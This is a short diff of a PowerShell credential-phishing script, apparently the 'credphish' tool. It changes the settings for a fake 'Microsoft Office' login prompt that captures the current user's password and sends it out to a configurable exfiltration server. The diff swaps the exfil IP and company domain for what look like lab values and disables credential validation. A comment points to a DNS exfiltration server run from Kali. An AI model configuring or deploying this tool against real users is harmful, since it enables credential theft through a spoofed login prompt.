@@ -23,16 +23,16 @@ Hide-Console
 
 
 # EXFILL ADDRESS (PLEASE EDIT THIS!!)
-$exfilServer = "192.168.200.2"
+$exfilServer = "192.168.111.10"
 
 # prompt
 $targetUser = $env:username
-$companyEmail = "contoso.com"
+$companyEmail = "stark.local"
 $promptCaption = "Microsoft Office"
 $promptMessage = "Connecting to: $targetUser@$companyEmail"
 $maxTries = 1 # maximum number of times to invoke prompt
 $delayPrompts = 2 # seconds between prompts
-$validateCredentials = $true # interrupt $maxTries and immediately exfil if credentials are valid
+$validateCredentials = $false # interrupt $maxTries and immediately exfil if credentials are valid
 
 # dns
 # start dns server in kali: python3 /path/to/credphish/dns_server.py
